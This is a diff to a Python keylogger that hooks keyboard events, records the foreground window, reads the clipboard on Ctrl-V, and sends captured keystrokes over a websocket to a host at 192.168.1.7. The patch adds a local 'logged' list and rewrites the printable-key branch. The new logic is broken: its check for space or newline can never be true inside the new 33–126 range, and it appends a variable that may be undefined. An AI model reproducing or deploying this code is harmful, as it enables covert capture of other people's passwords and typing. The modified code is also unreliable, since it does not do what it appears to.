@@ -12,6 +12,7 @@ current_window = None
 
 url = "ws://192.168.1.7:8765"
 
+logged = []
 
 def get_current_process():
     # get a handle to the foreground window
@@ -70,9 +71,10 @@ def KeyStroke(event):
         asyncio.get_event_loop().run_until_complete(client(data))
 
     # if they pressed a standard key
-    if 32 < event.Ascii < 127:
-        print(chr(event.Ascii))
-        asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
+    if 33 < event.Ascii < 127:
+        logged.append(data)
+        if event.Ascii == 32 or event.Ascii == 10:
+            asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
